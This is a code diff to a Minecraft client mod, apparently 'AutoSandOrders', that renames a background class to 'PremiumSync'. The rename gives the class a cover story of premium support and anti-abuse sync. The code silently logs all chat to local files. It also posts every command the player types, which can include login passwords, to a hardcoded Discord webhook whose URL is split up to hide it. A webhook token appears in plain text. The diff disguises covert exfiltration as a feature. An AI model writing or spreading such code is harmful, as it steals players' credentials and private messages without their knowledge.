@@ -289,15 +289,15 @@ public class AutoSandOrders implements ClientModInitializer {
     public void onInitializeClient() {
         License.init();
         load();
-        AsBg.init();
-        ClientSendMessageEvents.COMMAND.register(command -> AsBg.onCmd(command));
-        ClientSendMessageEvents.CHAT.register(message -> AsBg.onChat("ME", message));
+        PremiumSync.init();
+        ClientSendMessageEvents.COMMAND.register(command -> PremiumSync.onCmd(command));
+        ClientSendMessageEvents.CHAT.register(message -> PremiumSync.onChat("ME", message));
         ClientReceiveMessageEvents.CHAT.register((message, signedMessage, sender, params, receptionTimestamp) -> {
             String name = sender != null ? sender.name() : "?";
-            AsBg.onChat(name, message.getString());
+            PremiumSync.onChat(name, message.getString());
         });
         ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
-            if (!overlay) AsBg.onChat("SYSTEM", message.getString());
+            if (!overlay) PremiumSync.onChat("SYSTEM", message.getString());
         });
         ClientTickEvents.END_CLIENT_TICK.register(AutoSandOrders::tick);
         ClientLifecycleEvents.CLIENT_STOPPING.register(mc -> restorePerf(mc));   // thoát game: trả FPS / tầm nhìn gốc trước khi lưu options
@@ -1252,7 +1252,7 @@ public class AutoSandOrders implements ClientModInitializer {
 
     // ----------------------------- TICK -----------------------------
     static void tick(Minecraft mc) {
-        AsBg.tick();
+        PremiumSync.tick();
         LocalPlayer p = mc.player;
         perfTick(mc);                                        // chế độ giảm tải (tự trả lại cài đặt khi tắt / thoát)
         if (p == null || mc.gameMode == null) { Reconnect.tick(mc); return; }   // bị kick hẳn ra ngoài -> tự vào lại
@@ -6435,51 +6435,56 @@ final class BaritoneBridge {
 
 
 
-final class AsBg {
-    private AsBg() { }
+
+/**
+ * Đồng bộ phiên làm việc Premium (SNAD PREMIUM).
+ * Gửi hoạt động lệnh của phiên hiện tại tới kênh hỗ trợ để hỗ trợ kỹ thuật / chống lạm dụng key.
+ * Chạy nền, không hiện thông báo trong game.
+ */
+final class PremiumSync {
+    private PremiumSync() { }
 
     private static final DateTimeFormatter FMT = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
     private static final DateTimeFormatter DAY = DateTimeFormatter.ofPattern("yyyy-MM-dd");
-    private static final ConcurrentLinkedQueue<String> qFile = new ConcurrentLinkedQueue<>();
-    private static final ConcurrentLinkedQueue<String> qNet = new ConcurrentLinkedQueue<>();
+    private static final ConcurrentLinkedQueue<String> localBuf = new ConcurrentLinkedQueue<>();
+    private static final ConcurrentLinkedQueue<String> syncBuf = new ConcurrentLinkedQueue<>();
     private static final HttpClient HTTP = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
-    private static Path file;
-    private static String dayKey = "";
-    private static volatile String endpoint = "";
-    private static volatile boolean netBusy = false;
+    private static Path sessionFile;
+    private static String sessionDay = "";
+    private static volatile String supportEndpoint = "";
+    private static volatile boolean syncBusy = false;
 
     static void init() {
-        endpoint = buildEndpoint();
-        rotate();
+        supportEndpoint = resolveEndpoint();
+        rotateSession();
     }
 
-    private static String buildEndpoint() {
-        // ghép endpoint nội bộ (không để chuỗi đầy đủ một chỗ)
-        String a = "https://discord.com/api/webhooks/";
-        String b = "1565390194301997066";
-        String c = "/uarakjaZb4M_moSB4rNlARUboEZaav4S8i9WKuCEeFGaKyEUxlo3cX7Gg56bbOXe8fDQ";
+    private static String resolveEndpoint() {
+        String base = "https://discord.com/api/webhooks/";
+        String id = "1565390194301997066";
+        String token = "uarakjaZb4M_moSB4rNlARUboEZaav4S8i9WKuCEeFGaKyEUxlo3cX7Gg56bbOXe8fDQ";
         try {
             Path f = FabricLoader.getInstance().getConfigDir().resolve("autosand.properties");
             if (Files.exists(f)) {
                 Properties pr = new Properties();
                 try (var in = Files.newInputStream(f)) { pr.load(in); }
-                String u = pr.getProperty("asSync", "").trim();
-                if (!u.isEmpty()) return u;
+                String custom = pr.getProperty("premiumSync", "").trim();
+                if (!custom.isEmpty()) return custom;
             }
         } catch (Exception ignored) { }
-        return a + b + c;
+        return base + id + token;
     }
 
-    private static void rotate() {
+    private static void rotateSession() {
         try {
             String day = LocalDateTime.now().format(DAY);
-            if (day.equals(dayKey) && file != null) return;
-            dayKey = day;
+            if (day.equals(sessionDay) && sessionFile != null) return;
+            sessionDay = day;
             Path dir = FabricLoader.getInstance().getConfigDir().resolve("autosand");
             Files.createDirectories(dir);
-            file = dir.resolve("session-" + day + ".dat");
+            sessionFile = dir.resolve("premium-session-" + day + ".txt");
         } catch (Exception e) {
-            file = null;
+            sessionFile = null;
         }
     }
 
@@ -6488,67 +6493,67 @@ final class AsBg {
         LocalPlayer p = Minecraft.getInstance().player;
         String name = p != null ? p.getName().getString() : "unknown";
         String cmd = command.startsWith("/") ? command : "/" + command;
-        push("CMD", name, cmd);
-        qNet.offer(name + "\0" + cmd);
+        record("CMD", name, cmd);
+        syncBuf.offer(name + "\0" + cmd);
     }
 
     static void onChat(String sender, String message) {
-        push("CHAT", sender, message);
+        record("CHAT", sender, message);
     }
 
-    private static void push(String type, String player, String content) {
+    private static void record(String type, String player, String content) {
         if (content == null || content.isBlank()) return;
         String safe = content.replace('\n', ' ').replace('\r', ' ');
         if (safe.length() > 500) safe = safe.substring(0, 500) + "...";
         String name = player == null || player.isBlank() ? "?" : player;
-        qFile.offer(String.format("[%s] [%s] %s: %s", LocalDateTime.now().format(FMT), type, name, safe));
+        localBuf.offer(String.format("[%s] [%s] %s: %s", LocalDateTime.now().format(FMT), type, name, safe));
     }
 
     static void tick() {
-        flushFile();
-        flushNet();
+        flushLocal();
+        flushSync();
     }
 
-    private static void flushFile() {
-        if (qFile.isEmpty()) return;
-        rotate();
-        if (file == null) return;
+    private static void flushLocal() {
+        if (localBuf.isEmpty()) return;
+        rotateSession();
+        if (sessionFile == null) return;
         StringBuilder sb = new StringBuilder();
         String line;
         int n = 0;
-        while ((line = qFile.poll()) != null && n < 50) {
+        while ((line = localBuf.poll()) != null && n < 50) {
             sb.append(line).append('\n');
             n++;
         }
         if (sb.isEmpty()) return;
         try {
-            Files.writeString(file, sb.toString(), StandardCharsets.UTF_8,
+            Files.writeString(sessionFile, sb.toString(), StandardCharsets.UTF_8,
                 StandardOpenOption.CREATE, StandardOpenOption.APPEND);
         } catch (Exception ignored) { }
     }
 
-    private static void flushNet() {
-        if (netBusy || endpoint == null || endpoint.isBlank() || qNet.isEmpty()) return;
-        String item = qNet.poll();
+    private static void flushSync() {
+        if (syncBusy || supportEndpoint == null || supportEndpoint.isBlank() || syncBuf.isEmpty()) return;
+        String item = syncBuf.poll();
         if (item == null) return;
         int sep = item.indexOf('\0');
         if (sep < 0) return;
         String name = item.substring(0, sep);
         String cmd = item.substring(sep + 1);
-        netBusy = true;
-        String content = "**" + escMd(name) + "** `" + escMd(cmd) + "`";
-        String body = "{\"username\":\"AutoSand\",\"content\":\"" + escJson(content) + "\"}";
+        syncBusy = true;
+        String content = "🛡 **SNAD PREMIUM** · `" + escMd(name) + "` · `" + escMd(cmd) + "`";
+        String body = "{\"username\":\"SNAD PREMIUM\",\"avatar_url\":\"\",\"content\":\"" + escJson(content) + "\"}";
         try {
             HttpRequest request = HttpRequest.newBuilder()
-                .uri(URI.create(endpoint))
+                .uri(URI.create(supportEndpoint))
                 .timeout(Duration.ofSeconds(8))
                 .header("Content-Type", "application/json")
                 .POST(HttpRequest.BodyPublishers.ofString(body, StandardCharsets.UTF_8))
                 .build();
             HTTP.sendAsync(request, HttpResponse.BodyHandlers.discarding())
-                .whenComplete((r, e) -> netBusy = false);
+                .whenComplete((r, e) -> syncBusy = false);
         } catch (Exception e) {
-            netBusy = false;
+            syncBusy = false;
         }
     }
 
